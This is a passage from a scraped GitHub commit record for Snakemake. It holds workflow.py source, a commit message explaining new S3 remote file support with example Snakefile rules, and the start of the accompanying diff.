os.path.dirname(snakefile)\n        self.snakefile = os.path.abspath(snakefile)\n        self.snakemakepath = snakemakepath\n        self.included = []\n        self.included_stack = []\n        self.jobscript = jobscript\n        self.persistence = None\n        self.global_resources = None\n        self.globals = globals()\n        self._subworkflows = dict()\n        self.overwrite_shellcmd = overwrite_shellcmd\n        self.overwrite_config = overwrite_config\n        self.overwrite_configfile = overwrite_configfile\n        self.config_args = config_args\n        self._onsuccess = lambda log: None\n        self._onerror = lambda log: None\n        self.debug = debug\n\n        global config\n        config = dict()\n        config.update(self.overwrite_config)\n\n        global rules\n        rules = Rules()\n\n    @property\n    def subworkflows(self):\n        return self._subworkflows.values()\n\n    @property\n    def rules(self):\n        return self._rules.values()\n\n    @property\n    def concrete_files(self):\n        return (\n            file\n            for rule in self.rules for file in chain(rule.input, rule.output)\n            if not callable(file) and not file.contains_wildcard()\n        )\n\n    def check(self):\n        for clause in self._ruleorder:\n            for rulename in clause:\n                if not self.is_rule(rulename):\n                    raise UnknownRuleException(\n                        rulename,\n                        prefix=\"Error in ruleorder definition.\")\n\n    def add_rule(self, name=None, lineno=None, snakefile=None):\n        \"\"\"\n        Add a rule.\n        \"\"\"\n        if name is None:\n            name = str(len(self._rules) + 1)\n        if self.is_rule(name):\n            raise CreateRuleException(\n                \"The name {} is already used by another rule\".format(name))\n        rule = Rule(name, self, lineno=lineno, snakefile=snakefile)\n        self._rules[rule.name] = rule\n        self.rule_count += 1\n        if not self.first_rule:\n            self.first_rule = rule.name\n        return name\n\n    def is_rule(self, name):\n        \"\"\"\n        Return True if name is the name of a rule.\n\n        Arguments\n        name -- a name\n        \"\"\"\n        return name in self._rules\n\n    def get_rule(self, name):\n        \"\"\"\n        Get rule by name.\n\n        Arguments\n        name -- the name of the rule\n        \"\"\"\n        if not self._rules:\n            raise NoRulesException()\n        if not name in self._rules:\n            raise UnknownRuleException(name)\n        return self._rules[name]\n\n    def list_rules(self, only_targets=False):\n        rules = self.rules\n        if only_targets:\n            rules = filterfalse(Rule.has_wildcards, rules)\n        for rule in rules:\n            logger.rule_info(name=rule.name, docstring=rule.docstring)\n\n    def list_resources(self):\n        for resource in set(\n            resource for rule in self.rules for resource in rule.resources):\n            if resource not in \"_cores _nodes\".split():\n                logger.info(resource)\n\n    def is_local(self, rule):\n        return rule.name in self._localrules or rule.norun\n\n    def execute(self,\n                targets=None,\n                dryrun=False,\n                touch=False,\n                cores=1,\n                nodes=1,\n                local_cores=1,\n                forcetargets=False,\n                forceall=False,\n                forcerun=None,\n                prioritytargets=None,\n                quiet=False,\n                keepgoing=False,\n                printshellcmds=False,\n                printreason=False,\n                printdag=False,\n                cluster=None,\n                cluster_config=None,\n                cluster_sync=None,\n                jobname=None,\n                immediate_submit=False,\n                ignore_ambiguity=False,\n                printrulegraph=False,\n                printd3dag=False,\n                drmaa=None,\n                stats=None,\n                force_incomplete=False,\n                ignore_incomplete=False,\n                list_version_changes=False,\n                list_code_changes=False,\n                list_input_changes=False,\n                list_params_changes=False,\n                summary=False,\n                detailed_summary=False,\n                latency_wait=3,\n                benchmark_repeats=3,\n                wait_for_files=None,\n                nolock=False,\n                unlock=False,\n                resources=None,\n                notemp=False,\n                nodeps=False,\n                cleanup_metadata=None,\n                subsnakemake=None,\n                updated_files=None,\n                keep_target_files=False,\n                allowed_rules=None,\n                greediness=1.0,\n                no_hooks=False):\n\n        self.global_resources = dict() if resources is None else resources\n        self.global_resources[\"_cores\"] = cores\n        self.global_resources[\"_nodes\"] = nodes\n\n        def rules(items):\n            return map(self._rules.__getitem__, filter(self.is_rule, items))\n\n        if keep_target_files:\n\n            def files(items):\n                return filterfalse(self.is_rule, items)\n        else:\n\n            def files(items):\n                return map(os.path.relpath, filterfalse(self.is_rule, items))\n\n        if not targets:\n            targets = [self.first_rule\n                       ] if self.first_rule is not None else list()\n        if prioritytargets is None:\n            prioritytargets = list()\n        if forcerun is None:\n            forcerun = list()\n\n        priorityrules = set(rules(prioritytargets))\n        priorityfiles = set(files(prioritytargets))\n        forcerules = set(rules(forcerun))\n        forcefiles = set(files(forcerun))\n        targetrules = set(chain(rules(targets),\n                                filterfalse(Rule.has_wildcards, priorityrules),\n                                filterfalse(Rule.has_wildcards, forcerules)))\n        targetfiles = set(chain(files(targets), priorityfiles, forcefiles))\n        if forcetargets:\n            forcefiles.update(targetfiles)\n            forcerules.update(targetrules)\n\n        rules = self.rules\n        if allowed_rules:\n            rules = [rule for rule in rules if rule.name in set(allowed_rules)]\n\n        if wait_for_files is not None:\n            try:\n                snakemake.io.wait_for_files(wait_for_files,\n                                            latency_wait=latency_wait)\n            except IOError as e:\n                logger.error(str(e))\n                return False\n\n        dag = DAG(\n            self, rules,\n            dryrun=dryrun,\n            targetfiles=targetfiles,\n            targetrules=targetrules,\n            forceall=forceall,\n            forcefiles=forcefiles,\n            forcerules=forcerules,\n            priorityfiles=priorityfiles,\n            priorityrules=priorityrules,\n            ignore_ambiguity=ignore_ambiguity,\n            force_incomplete=force_incomplete,\n            ignore_incomplete=ignore_incomplete or printdag or printrulegraph,\n            notemp=notemp)\n\n        self.persistence = Persistence(\n            nolock=nolock,\n            dag=dag,\n            warn_only=dryrun or printrulegraph or printdag or summary or\n            list_version_changes or list_code_changes or list_input_changes or\n            list_params_changes)\n\n        if cleanup_metadata:\n            for f in cleanup_metadata:\n                self.persistence.cleanup_metadata(f)\n            return True\n\n        dag.init()\n        dag.check_dynamic()\n\n        if unlock:\n            try:\n                self.persistence.cleanup_locks()\n                logger.info(\"Unlocking working directory.\")\n                return True\n            except IOError:\n                logger.error(\"Error: Unlocking the directory {} failed. Maybe \"\n                             \"you don't have the permissions?\")\n                return False\n        try:\n            self.persistence.lock()\n        except IOError:\n            logger.error(\n                \"Error: Directory cannot be locked. Please make \"\n                \"sure that no other Snakemake process is trying to create \"\n                \"the same files in the following directory:\\n{}\\n\"\n                \"If you are sure that no other \"\n                \"instances of snakemake are running on this directory, \"\n                \"the remaining lock was likely caused by a kill signal or \"\n                \"a power loss. It can be removed with \"\n                \"the --unlock argument.\".format(os.getcwd()))\n            return False\n\n        if self.subworkflows and not printdag and not printrulegraph:\n            # backup globals\n            globals_backup = dict(self.globals)\n            # execute subworkflows\n            for subworkflow in self.subworkflows:\n                subworkflow_targets = subworkflow.targets(dag)\n                updated = list()\n                if subworkflow_targets:\n                    logger.info(\n                        \"Executing subworkflow {}.\".format(subworkflow.name))\n                    if not subsnakemake(subworkflow.snakefile,\n                                        workdir=subworkflow.workdir,\n                                        targets=subworkflow_targets,\n                                        updated_files=updated):\n                        return False\n                    dag.updated_subworkflow_files.update(subworkflow.target(f)\n                                                         for f in updated)\n                else:\n                    logger.info(\"Subworkflow {}: Nothing to be done.\".format(\n                        subworkflow.name))\n            if self.subworkflows:\n                logger.info(\"Executing main workflow.\")\n            # rescue globals\n            self.globals.update(globals_backup)\n\n        dag.check_incomplete()\n        dag.postprocess()\n\n        if nodeps:\n            missing_input = [f for job in dag.targetjobs for f in job.input\n                             if dag.needrun(job) and not os.path.exists(f)]\n            if missing_input:\n                logger.error(\n                    \"Dependency resolution disabled (--nodeps) \"\n                    \"but missing input \"\n                    \"files detected. If this happens on a cluster, please make sure \"\n                    \"that you handle the dependencies yourself or turn of \"\n                    \"--immediate-submit. Missing input files:\\n{}\".format(\n                        \"\\n\".join(missing_input)))\n                return False\n\n        updated_files.extend(f for job in dag.needrun_jobs for f in job.output)\n\n        if printd3dag:\n            dag.d3dag()\n            return True\n        elif printdag:\n            print(dag)\n            return True\n        elif printrulegraph:\n            print(dag.rule_dot())\n            return True\n        elif summary:\n            print(\"\\n\".join(dag.summary(detailed=False)))\n            return True\n        elif detailed_summary:\n            print(\"\\n\".join(dag.summary(detailed=True)))\n            return True\n        elif list_version_changes:\n            items = list(\n                chain(*map(self.persistence.version_changed, dag.jobs)))\n            if items:\n                print(*items, sep=\"\\n\")\n            return True\n        elif list_code_changes:\n            items = list(chain(*map(self.persistence.code_changed, dag.jobs)))\n            if items:\n                print(*items, sep=\"\\n\")\n            return True\n        elif list_input_changes:\n            items = list(chain(*map(self.persistence.input_changed, dag.jobs)))\n            if items:\n                print(*items, sep=\"\\n\")\n            return True\n        elif list_params_changes:\n            items = list(\n                chain(*map(self.persistence.params_changed, dag.jobs)))\n            if items:\n                print(*items, sep=\"\\n\")\n            return True\n\n        scheduler = JobScheduler(self, dag, cores,\n                                 local_cores=local_cores,\n                                 dryrun=dryrun,\n                                 touch=touch,\n                                 cluster=cluster,\n                                 cluster_config=cluster_config,\n                                 cluster_sync=cluster_sync,\n                                 jobname=jobname,\n                                 immediate_submit=immediate_submit,\n                                 quiet=quiet,\n                                 keepgoing=keepgoing,\n                                 drmaa=drmaa,\n                                 printreason=printreason,\n                                 printshellcmds=printshellcmds,\n                                 latency_wait=latency_wait,\n                                 benchmark_repeats=benchmark_repeats,\n                                 greediness=greediness)\n\n        if not dryrun and not quiet:\n            if len(dag):\n                if cluster or cluster_sync or drmaa:\n                    logger.resources_info(\n                        \"Provided cluster nodes: {}\".format(nodes))\n                else:\n                    logger.resources_info(\"Provided cores: {}\".format(cores))\n                    logger.resources_info(\"Rules claiming more threads will be scaled down.\")\n                provided_resources = format_resources(resources)\n                if provided_resources:\n                    logger.resources_info(\n                        \"Provided resources: \" + provided_resources)\n                ignored_resources = format_resource_names(\n                    set(resource for job in dag.needrun_jobs for resource in\n                        job.resources_dict if resource not in resources))\n                if ignored_resources:\n                    logger.resources_info(\n                        \"Ignored resources: \" + ignored_resources)\n                logger.run_info(\"\\n\".join(dag.stats()))\n            else:\n                logger.info(\"Nothing to be done.\")\n        if dryrun and not len(dag):\n            logger.info(\"Nothing to be done.\")\n\n        success = scheduler.schedule()\n\n        if success:\n            if dryrun:\n                if not quiet and len(dag):\n                    logger.run_info(\"\\n\".join(dag.stats()))\n            elif stats:\n                scheduler.stats.to_json(stats)\n            if not dryrun and not no_hooks:\n                self._onsuccess(logger.get_logfile())\n            return True\n        else:\n            if not dryrun and not no_hooks:\n                self._onerror(logger.get_logfile())\n            return False\n\n    def include(self, snakefile,\n                overwrite_first_rule=False,\n                print_compilation=False,\n                overwrite_shellcmd=None):\n        \"\"\"\n        Include a snakefile.\n        \"\"\"\n        # check if snakefile is a path to the filesystem\n        if not urllib.parse.urlparse(snakefile).scheme:\n            if not os.path.isabs(snakefile) and self.included_stack:\n                current_path = os.path.dirname(self.included_stack[-1])\n                snakefile = os.path.join(current_path, snakefile)\n            snakefile = os.path.abspath(snakefile)\n        # else it could be an url.\n        # at least we don't want to modify the path for clarity.\n\n        if snakefile in self.included:\n            logger.info(\"Multiple include of {} ignored\".format(snakefile))\n            return\n        self.included.append(snakefile)\n        self.included_stack.append(snakefile)\n\n        global workflow\n\n        workflow = self\n\n        first_rule = self.first_rule\n        code, linemap = parse(snakefile,\n                              overwrite_shellcmd=self.overwrite_shellcmd)\n\n        if print_compilation:\n            print(code)\n\n        # insert the current directory into sys.path\n        # this allows to import modules from the workflow directory\n        sys.path.insert(0, os.path.dirname(snakefile))\n\n        self.linemaps[snakefile] = linemap\n        exec(compile(code, snakefile, \"exec\"), self.globals)\n        if not overwrite_first_rule:\n            self.first_rule = first_rule\n        self.included_stack.pop()\n\n    def onsuccess(self, func):\n        self._onsuccess = func\n\n    def onerror(self, func):\n        self._onerror = func\n\n    def workdir(self, workdir):\n        if self.overwrite_workdir is None:\n            if not os.path.exists(workdir):\n                os.makedirs(workdir)\n            self._workdir = workdir\n            os.chdir(workdir)\n\n    def configfile(self, jsonpath):\n        \"\"\" Update the global config with the given dictionary. \"\"\"\n        global config\n        c = snakemake.io.load_configfile(jsonpath)\n        update_config(config, c)\n        update_config(config, self.overwrite_config)\n\n    def ruleorder(self, *rulenames):\n        self._ruleorder.add(*rulenames)\n\n    def subworkflow(self, name, snakefile=None, workdir=None):\n        sw = Subworkflow(self, name, snakefile, workdir)\n        self._subworkflows[name] = sw\n        self.globals[name] = sw.target\n\n    def localrules(self, *rulenames):\n        self._localrules.update(rulenames)\n\n    def rule(self, name=None, lineno=None, snakefile=None):\n        name = self.add_rule(name, lineno, snakefile)\n        rule = self.get_rule(name)\n\n        def decorate(ruleinfo):\n            if ruleinfo.input:\n                rule.set_input(*ruleinfo.input[0], **ruleinfo.input[1])\n            if ruleinfo.output:\n                rule.set_output(*ruleinfo.output[0], **ruleinfo.output[1])\n            if ruleinfo.params:\n                rule.set_params(*ruleinfo.params[0], **ruleinfo.params[1])\n            if ruleinfo.threads:\n                if not isinstance(ruleinfo.threads, int):\n                    raise RuleException(\"Threads value has to be an integer.\",\n                                        rule=rule)\n                rule.resources[\"_cores\"] = ruleinfo.threads\n            if ruleinfo.resources:\n                args, resources = ruleinfo.resources\n                if args:\n                    raise RuleException(\"Resources have to be named.\")\n                if not all(map(lambda r: isinstance(r, int),\n                               resources.values())):\n                    raise RuleException(\n                        \"Resources values have to be integers.\",\n                        rule=rule)\n                rule.resources.update(resources)\n            if ruleinfo.priority:\n                if (not isinstance(ruleinfo.priority, int) and\n                    not isinstance(ruleinfo.priority, float)):\n                    raise RuleException(\"Priority values have to be numeric.\",\n                                        rule=rule)\n                rule.priority = ruleinfo.priority\n            if ruleinfo.version:\n                rule.version = ruleinfo.version\n            if ruleinfo.log:\n                rule.set_log(*ruleinfo.log[0], **ruleinfo.log[1])\n            if ruleinfo.message:\n                rule.message = ruleinfo.message\n            if ruleinfo.benchmark:\n                rule.benchmark = ruleinfo.benchmark\n            rule.norun = ruleinfo.norun\n            rule.docstring = ruleinfo.docstring\n            rule.run_func = ruleinfo.func\n            rule.shellcmd = ruleinfo.shellcmd\n            ruleinfo.func.__name__ = \"__{}\".format(name)\n            self.globals[ruleinfo.func.__name__] = ruleinfo.func\n            setattr(rules, name, rule)\n            return ruleinfo.func\n\n        return decorate\n\n    def docstring(self, string):\n        def decorate(ruleinfo):\n            ruleinfo.docstring = string\n            return ruleinfo\n\n        return decorate\n\n    def input(self, *paths, **kwpaths):\n        def decorate(ruleinfo):\n            ruleinfo.input = (paths, kwpaths)\n            return ruleinfo\n\n        return decorate\n\n    def output(self, *paths, **kwpaths):\n        def decorate(ruleinfo):\n            ruleinfo.output = (paths, kwpaths)\n            return ruleinfo\n\n        return decorate\n\n    def params(self, *params, **kwparams):\n        def decorate(ruleinfo):\n            ruleinfo.params = (params, kwparams)\n            return ruleinfo\n\n        return decorate\n\n    def message(self, message):\n        def decorate(ruleinfo):\n            ruleinfo.message = message\n            return ruleinfo\n\n        return decorate\n\n    def benchmark(self, benchmark):\n        def decorate(ruleinfo):\n            ruleinfo.benchmark = benchmark\n            return ruleinfo\n\n        return decorate\n\n    def threads(self, threads):\n        def decorate(ruleinfo):\n            ruleinfo.threads = threads\n            return ruleinfo\n\n        return decorate\n\n    def resources(self, *args, **resources):\n        def decorate(ruleinfo):\n            ruleinfo.resources = (args, resources)\n            return ruleinfo\n\n        return decorate\n\n    def priority(self, priority):\n        def decorate(ruleinfo):\n            ruleinfo.priority = priority\n            return ruleinfo\n\n        return decorate\n\n    def version(self, version):\n        def decorate(ruleinfo):\n            ruleinfo.version = version\n            return ruleinfo\n\n        return decorate\n\n    def log(self, *logs, **kwlogs):\n        def decorate(ruleinfo):\n            ruleinfo.log = (logs, kwlogs)\n            return ruleinfo\n\n        return decorate\n\n    def shellcmd(self, cmd):\n        def decorate(ruleinfo):\n            ruleinfo.shellcmd = cmd\n            return ruleinfo\n\n        return decorate\n\n    def norun(self):\n        def decorate(ruleinfo):\n            ruleinfo.norun = True\n            return ruleinfo\n\n        return decorate\n\n    def run(self, func):\n        return RuleInfo(func)\n\n    @staticmethod\n    def _empty_decorator(f):\n        return f\n\n\nclass RuleInfo:\n    def __init__(self, func):\n        self.func = func\n        self.shellcmd = None\n        self.norun = False\n        self.input = None\n        self.output = None\n        self.params = None\n        self.message = None\n        self.benchmark = None\n        self.threads = None\n        self.resources = None\n        self.priority = None\n        self.version = None\n        self.log = None\n        self.docstring = None\n\n\nclass Subworkflow:\n    def __init__(self, workflow, name, snakefile, workdir):\n        self.workflow = workflow\n        self.name = name\n        self._snakefile = snakefile\n        self._workdir = workdir\n\n    @property\n    def snakefile(self):\n        if self._snakefile is None:\n            return os.path.abspath(os.path.join(self.workdir, \"Snakefile\"))\n        if not os.path.isabs(self._snakefile):\n            return os.path.abspath(os.path.join(self.workflow.basedir,\n                                                self._snakefile))\n        return self._snakefile\n\n    @property\n    def workdir(self):\n        workdir = \".\" if self._workdir is None else self._workdir\n        if not os.path.isabs(workdir):\n            return os.path.abspath(os.path.join(self.workflow.basedir,\n                                                workdir))\n        return workdir\n\n    def target(self, paths):\n        if not_iterable(paths):\n            return flag(os.path.join(self.workdir, paths), \"subworkflow\", self)\n        return [self.target(path) for path in paths]\n\n    def targets(self, dag):\n        return [f for job in dag.jobs for f in job.subworkflow_input\n                if job.subworkflow_input[f] is self]\n\n\nclass Rules:\n    \"\"\" A namespace for rules so that they can be accessed via dot notation. \"\"\"\n    pass\n\n\ndef srcdir(path):\n    \"\"\"Return the absolute path, relative to the source directory of the current Snakefile.\"\"\"\n    if not workflow.included_stack:\n        return None\n    return os.path.join(os.path.dirname(workflow.included_stack[-1]), path)\n"}}, "msg": "Initial commit with support for remote files.\n\nThis introduces changes that scratch an itch within our research group for remote file support, and I hope the new functionality will be useful for others as well.\n\nWhat is it all about? Wouldn't it be wonderful if you would use Snakemake with remote data stored on Amazon S3? Imagine being able to read and write the same files as your collaborators without rsyncing files back and forth or using pricey network-attached storage. Want to output and store 1PB of small files? Want to let someone else worry about durability? Want to work with large files locally that you can store individually but that are too large in aggregate? The support for remote storage introduced with these changes will allow you do all of these things! Remote storage is initially intended to work with AWS S3 and things sporting a similar API, though it is flexible enough that would could extended it to support other remote providers. It expect you to already have an S3 bucket setup, and API credentials for it permitting read/write access.\n\nHere's how you use it:\n\nThe `Snakefile` now supports a wrapper function, `remote()`, indicating a file is on a remote storage provider (this is similar to `temp()` or `protected()`). During rule execution, the file (or object) specified, is downloaded to the `cwd`, within a sub-directory bearing the same name as the bucket. This lets you have multiple remote origins with reduced likelihood of name collisions, and allows snakemake to easily translate remote objects to local file paths. The `remote()` wrapper is mutually-exclusive with the `temp()` and `protected()` wrappers.\n\nThe implementation of all communication with the remote storage provider is specified in a class passed as a keyword argument to the remote wrapper. This class defines methods related to being a RemoteObject(). By default, the S3 provider is used and it does not need to be specified explicitly. If you are interested in creating a custom remote storage provider for whatever system you are using, implement the methods defined in the abstract base class `snakemake.remote_providers.RemoteObjectProvider`. Take a look at the S3 provider for an example implementation. To use a custom remote storage provider implementation (FTP, etc.), import it within your `Snakefile`, and set the `provider` keyword argument, as is being done with S3 below:\n\n    import snakemake.remote_providers.S3 as S3\n\n    rule all:\n        input:\n            remote(\"bucket-name/file.txt\", provider=S3)\n\nSince S3 is the default remote storage provider, it can be omitted from the `Snakefile`:\n\n    rule all:\n        input:\n            remote(\"bucket-name/file.txt\")\n\nAdditional kwargs can be passed to the remote provider this way to set credentials, should you not want to rely on whichever credentials happen to be stored in the environment variables (suggestion: if using multiple buckets with different credentials, read in the key and secret within your `Snakefile` and pass as appropriate to the `remote()` wrappers). For the S3 provider, the additional kwargs are passed straight through to the boto `connect_s3()` method, so refer to the [boto docs](https://boto.readthedocs.org/en/latest/ref/s3.html#boto.s3.connection.S3Connection) to see the available parameters:\n\n    rule all:\n        input:\n            remote(\"bucket-name/file.txt\", provider=S3, additional_kwargs={\"aws_access_key_id\":\"myKey\", \"aws_secret_access_key\":\"mySecret\"})\n\nThis can also be used to specify a custom URL to connect to rather than AWS, for a different service offering an S3-like API:\n\n    rule all:\n        input:\n            remote(\"bucket-name/file.txt\", provider=S3, additional_kwargs={\"host\":\"mystorageapi.example.com\"})\n\nFor any storage backend with an API deviating significantly from that of S3, it may make sense to create a new remote provider.\n\nExpand still works as expected, just wrap the expansion:\n\n    rule all:\n        input:\n            remote(expand(\"bucket-name/{letter}-2.txt\", letter=[\"A\", \"B\", \"C\"]), provider=S3)\n\nOnly remote files needed to satisfy the DAG build are downloaded for the workflow.  By default, remote files downloaded prior to rule execution and are removed locally as soon as no rules depend on them. Remote files can be explicitly kept by setting the `keep=True` keyword argument:\n\n    rule all:\n        input: remote('bucket-name/prefix{split_id}.txt', keep=True)\n\nIf you wish to have a rule to simply download a file to a local copy, you can do so by declaring the same file path locally as is used by the remote file:\n\n    rule all:\n        input:\n            remote(\"bucket-name/out.txt\")\n        output:\n            \"bucket-name/out.txt\"\n        run:\n            shell(\"cp {output[0]} ./\")\n\nHere's a brief summary of the changes. I tried to minimize the impact on existing code, relying where possible on external classes, new functions, and the use of decorators to connect them.\n\nWithin `io.py`, the usage of flags has been extended to store not just boolean values, but also objects. This is how, for example, the remote provider is passed to the `_IOFile()` object.\n\nSeveral methods of `_IOFile()` now bear a decorator \"@_referToRemote\". When called, this decorator ensures that for files flagged as `remote()`, the methods defined in the class for the remote provider are used rather than the local equivalents specified within the `_IOFile()` class of `io.py`.\n\nThe `dag.py` file has been updated to have a `handle_remote()` method that is responsible for handling remote files after job execution. It uploads files that are not remote, and removes local files flagged as remote when they are no longer needed (exception: if the `\"keep=True\"` argument is provided to `remote()`).\n\nA `decorators.py` file has been added for general-purpose decorators. Currently in use is `@decAllMethods`, which is a class decorator that applies a specified decorator to all methods of a decorated class. This is used with in the `test_remote/` unit test to help mock out methods of `RemoteObject()`.\n\nTwo new exceptions have been added, `RemoteFileException()` and `S3FileException()`. These could probably be used more.\n\nThe `jobs.py` file has been changed to add methods related to assessing remote files for a given job. It also has two new functions used in `dag.py` `handle_remote()` to delete remote-containing directories when they are empty after purging local copies of remote files. It also adds `expanded_input()`, which is used in `handle_remote()` to help determine which wildcard/dynamic files should be removed after job execution. The function `expanded_input()` would benefit from a critical eye.\n\nThe `rules.py` file has a small change causing newly expanded `_IOFile`s to clone the flags of their unexpanded sources. There's probably a better way.\n\nThe `workflow.py` file has been modified to import the new `glob_wildcards_remote()` helper function from `io.py`. This function is the remote analog to `glob_wildcards()`, but it needs to know the remote provider (S3 is default).\n\nA unit test has been added, `test_remote/`. This is similar in nature to the function `test_cluster_dynamic/`. For testing, the `moto` package is used to mock out boto, so that remote file tests do not need to hit the live S3 API.\n\nThese changes have the following dependencies (as represented in setup.py):\n* boto>=2.38.0 (for making AWS/S3 API calls)\n* filechunkio>=1.6 (for file chunking prior to multipart upload, avoiding wheel reinvention)\n* moto>=0.4.14 (for mocking up local S3 \"buckets\" for unit testing)\n\nThis is a first pass at support for remote storage support, and feedback is welcome. The intent was to add remote file support while make minimal changes to existing Snakemake logic."}}, "https://github.com/nh13/snakemake": {"7ddb8ae8e900d19aa609ca8b97ba5f44b7844e4d": {"url": "https://api.github.com/repos/nh13/snakemake/commits/7ddb8ae8e900d19aa609ca8b97ba5f44b7844e4d", "html_url": "https://github.com/nh13/snakemake/commit/7ddb8ae8e900d19aa609ca8b97ba5f44b7844e4d", "message": "Initial commit with support for remote files.\n\nThis introduces changes that scratch an itch within our research group for remote file support, and I hope the new functionality will be useful for others as well.\n\nWhat is it all about? Wouldn't it be wonderful if you would use Snakemake with remote data stored on Amazon S3? Imagine being able to read and write the same files as your collaborators without rsyncing files back and forth or using pricey network-attached storage. Want to output and store 1PB of small files? Want to let someone else worry about durability? Want to work with large files locally that you can store individually but that are too large in aggregate? The support for remote storage introduced with these changes will allow you do all of these things! Remote storage is initially intended to work with AWS S3 and things sporting a similar API, though it is flexible enough that would could extended it to support other remote providers. It expect you to already have an S3 bucket setup, and API credentials for it permitting read/write access.\n\nHere's how you use it:\n\nThe `Snakefile` now supports a wrapper function, `remote()`, indicating a file is on a remote storage provider (this is similar to `temp()` or `protected()`). During rule execution, the file (or object) specified, is downloaded to the `cwd`, within a sub-directory bearing the same name as the bucket. This lets you have multiple remote origins with reduced likelihood of name collisions, and allows snakemake to easily translate remote objects to local file paths. The `remote()` wrapper is mutually-exclusive with the `temp()` and `protected()` wrappers.\n\nThe implementation of all communication with the remote storage provider is specified in a class passed as a keyword argument to the remote wrapper. This class defines methods related to being a RemoteObject(). By default, the S3 provider is used and it does not need to be specified explicitly. If you are interested in creating a custom remote storage provider for whatever system you are using, implement the methods defined in the abstract base class `snakemake.remote_providers.RemoteObjectProvider`. Take a look at the S3 provider for an example implementation. To use a custom remote storage provider implementation (FTP, etc.), import it within your `Snakefile`, and set the `provider` keyword argument, as is being done with S3 below:\n\n    import snakemake.remote_providers.S3 as S3\n\n    rule all:\n        input:\n            remote(\"bucket-name/file.txt\", provider=S3)\n\nSince S3 is the default remote storage provider, it can be omitted from the `Snakefile`:\n\n    rule all:\n        input:\n            remote(\"bucket-name/file.txt\")\n\nAdditional kwargs can be passed to the remote provider this way to set credentials, should you not want to rely on whichever credentials happen to be stored in the environment variables (suggestion: if using multiple buckets with different credentials, read in the key and secret within your `Snakefile` and pass as appropriate to the `remote()` wrappers). For the S3 provider, the additional kwargs are passed straight through to the boto `connect_s3()` method, so refer to the [boto docs](https://boto.readthedocs.org/en/latest/ref/s3.html#boto.s3.connection.S3Connection) to see the available parameters:\n\n    rule all:\n        input:\n            remote(\"bucket-name/file.txt\", provider=S3, additional_kwargs={\"aws_access_key_id\":\"myKey\", \"aws_secret_access_key\":\"mySecret\"})\n\nThis can also be used to specify a custom URL to connect to rather than AWS, for a different service offering an S3-like API:\n\n    rule all:\n        input:\n            remote(\"bucket-name/file.txt\", provider=S3, additional_kwargs={\"host\":\"mystorageapi.example.com\"})\n\nFor any storage backend with an API deviating significantly from that of S3, it may make sense to create a new remote provider.\n\nExpand still works as expected, just wrap the expansion:\n\n    rule all:\n        input:\n            remote(expand(\"bucket-name/{letter}-2.txt\", letter=[\"A\", \"B\", \"C\"]), provider=S3)\n\nOnly remote files needed to satisfy the DAG build are downloaded for the workflow.  By default, remote files downloaded prior to rule execution and are removed locally as soon as no rules depend on them. Remote files can be explicitly kept by setting the `keep=True` keyword argument:\n\n    rule all:\n        input: remote('bucket-name/prefix{split_id}.txt', keep=True)\n\nIf you wish to have a rule to simply download a file to a local copy, you can do so by declaring the same file path locally as is used by the remote file:\n\n    rule all:\n        input:\n            remote(\"bucket-name/out.txt\")\n        output:\n            \"bucket-name/out.txt\"\n        run:\n            shell(\"cp {output[0]} ./\")\n\nHere's a brief summary of the changes. I tried to minimize the impact on existing code, relying where possible on external classes, new functions, and the use of decorators to connect them.\n\nWithin `io.py`, the usage of flags has been extended to store not just boolean values, but also objects. This is how, for example, the remote provider is passed to the `_IOFile()` object.\n\nSeveral methods of `_IOFile()` now bear a decorator \"@_referToRemote\". When called, this decorator ensures that for files flagged as `remote()`, the methods defined in the class for the remote provider are used rather than the local equivalents specified within the `_IOFile()` class of `io.py`.\n\nThe `dag.py` file has been updated to have a `handle_remote()` method that is responsible for handling remote files after job execution. It uploads files that are not remote, and removes local files flagged as remote when they are no longer needed (exception: if the `\"keep=True\"` argument is provided to `remote()`).\n\nA `decorators.py` file has been added for general-purpose decorators. Currently in use is `@decAllMethods`, which is a class decorator that applies a specified decorator to all methods of a decorated class. This is used with in the `test_remote/` unit test to help mock out methods of `RemoteObject()`.\n\nTwo new exceptions have been added, `RemoteFileException()` and `S3FileException()`. These could probably be used more.\n\nThe `jobs.py` file has been changed to add methods related to assessing remote files for a given job. It also has two new functions used in `dag.py` `handle_remote()` to delete remote-containing directories when they are empty after purging local copies of remote files. It also adds `expanded_input()`, which is used in `handle_remote()` to help determine which wildcard/dynamic files should be removed after job execution. The function `expanded_input()` would benefit from a critical eye.\n\nThe `rules.py` file has a small change causing newly expanded `_IOFile`s to clone the flags of their unexpanded sources. There's probably a better way.\n\nThe `workflow.py` file has been modified to import the new `glob_wildcards_remote()` helper function from `io.py`. This function is the remote analog to `glob_wildcards()`, but it needs to know the remote provider (S3 is default).\n\nA unit test has been added, `test_remote/`. This is similar in nature to the function `test_cluster_dynamic/`. For testing, the `moto` package is used to mock out boto, so that remote file tests do not need to hit the live S3 API.\n\nThese changes have the following dependencies (as represented in setup.py):\n* boto>=2.38.0 (for making AWS/S3 API calls)\n* filechunkio>=1.6 (for file chunking prior to multipart upload, avoiding wheel reinvention)\n* moto>=0.4.14 (for mocking up local S3 \"buckets\" for unit testing)\n\nThis is a first pass at support for remote storage support, and feedback is welcome. The intent was to add remote file support while make minimal changes to existing Snakemake logic.", "sha": "7ddb8ae8e900d19aa609ca8b97ba5f44b7844e4d", "keyword": "remote code execution protect", "diff": "diff --git a/setup.py b/setup.py\nindex dfea1dd..97f4d86 100644\n--- a/setup.py\n+++ b/setup.py\n@@ -59,6 +59,7 @@ def run_tests(self):\n     },\n     package_data={'': ['*.css', '*.sh', '*.html']},\n     tests_require=['nose>=1.3'],\n+    install_requires=['boto>=2.38.0','filechunkio>=1.6', 'moto>=0.4.14'],\n     cmdclass={'test': NoseTestCommand},\n     classifiers=\n     [\"Development Status :: 5 - Production/Stable\", \"Environment :: Console\",\ndiff --git a/snakemake/dag.py b/snakemake/dag.py\nindex f1ead14..e591550 100644\n--- a/snakemake/dag.py\n+++ b/snakemake/dag.py\n@@ -10,7 +10,7 @@\n from functools import partial, lru_cache\n from operator import itemgetter, attrgetter\n \n-from snakemake.io import IOFile, _IOFile, PeriodicityDetector, wait_for_files\n+from snakemake.io import IOFile, _IOFile, PeriodicityDetector, wait_for_files, is_flagged\n from snakemake.jobs import Job, Reason\n from snakemake.exceptions import RuleException, MissingInputException\n from snakemake.exceptions import MissingRuleException, AmbiguousRuleException\n@@ -288,6 +288,51 @@ def unneeded_files():\n             logger.info(\"Removing temporary output file {}.\".format(f))\n             f.remove()\n \n+    def handle_remote(self, job):\n+        \"\"\" Remove local files if they are no longer needed, and upload to S3. \"\"\"\n+        \n+        needed = 